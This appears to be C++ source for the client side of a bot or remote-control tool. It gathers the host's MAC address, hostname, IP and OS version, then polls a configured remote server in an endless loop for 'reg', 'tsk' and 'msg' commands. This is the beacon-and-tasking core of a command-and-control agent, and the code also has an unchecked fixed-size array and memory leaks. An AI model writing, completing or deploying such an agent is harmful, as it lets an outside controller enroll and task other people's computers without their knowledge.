#include "s_classes.h"
#include "config.h"

#include <string.h>
#include <Windows.h>
#include <stdio.h>
#include <iostream>


void main(){

	// Use the following on startup, this will alow to view the PC details as the server starts up in debug mode.
#ifdef _DEBUG
	Machine_inf DEBstr;

    printf("Initialized\n ---------------------\n|  Local Information  |\n ---------------------\n");
	printf("Mac (UID): %s\nHostname: %s\nLocal IP: %s\nOS Version: %s\n", DEBstr.getMAC(),DEBstr.host_name(),DEBstr.lan_ip(),DEBstr.OS_version());
	printf(" ---------------------\n|  Remote Information |\n ---------------------\n");
	printf("Remote IP: %s\nWeb Path : %s\nPort number: %d\nTime Out : %d \n",Domain_name, Web_path, Port_no, time_out_in_seconds);
	printf(" ---------------------\n\n");
#endif
	//Set Variables
	char* api;
	char* rqread;
	httprp rq;
	task tsk;

		//set the api request
	api = rq.post_gate(Web_path);
#ifdef _DEBUG
    printf("Set Api: %s\n",api);
#endif
		//Execute web request With api
	rqread = rq.getrp(Domain_name,Port_no, api);
#ifdef _DEBUG
    printf("Return: %s\n",rqread);
#endif

	// Start an infinite while loop, using a timeout at the end.
	while(1){

	// split string
	// this is being used to split the char * rqread into params[]
	char * pch;
	pch = strtok (strdup(rqread), spliter);
	char *params[5];

	int i =0;
	while (pch != NULL){
		params[i] = pch;
		pch = strtok (NULL, spliter);
		i++;
	}
#ifdef _DEBUG
	printf("Split Strings using: %s\n",spliter);
#endif
	///////////////////////////////////////////////////////

	char *x = params[0];
#ifdef _DEBUG
	printf("Task Parameter: %s\n",params[0]);
#endif

	if(!strcmp(x, "reg")){
		
		api = rq.post_reg(Web_path);
		rqread = rq.getrp(Domain_name,Port_no, api);
#ifdef _DEBUG
		printf("Command Register: %s\n",x);
		printf("Command API: %s \n", api);
		printf("Command Return: %s \n", rqread);
#endif

	}
///////////////////////////////////////////////////


	if(!strcmp(x, "tsk")){
	//	printf("register %s\n",x);
		api = rq.post_task(Web_path, params[1]);
		rqread = rq.getrp(Domain_name,Port_no, api);
#ifdef _DEBUG
		printf("Command Task: %s\n",x);
		printf("Command API: %s \n", api);
		printf("Retrive Task: %s \n", rqread);
#endif
	}

///////////////////////////////////////////////////
	if(!strcmp(x, "msg")){
		
		tsk.msg(params[1]);
#ifdef _DEBUG
		printf("Command Message: %s\n",x);
		printf("Command Print: %s \n", params[1]);
#endif
	}
///////////////////////////////////////////////////

	Sleep(time_out_in_seconds * 20); 
	}
	
///////////////////////////////////////////////////

system("pause");
}

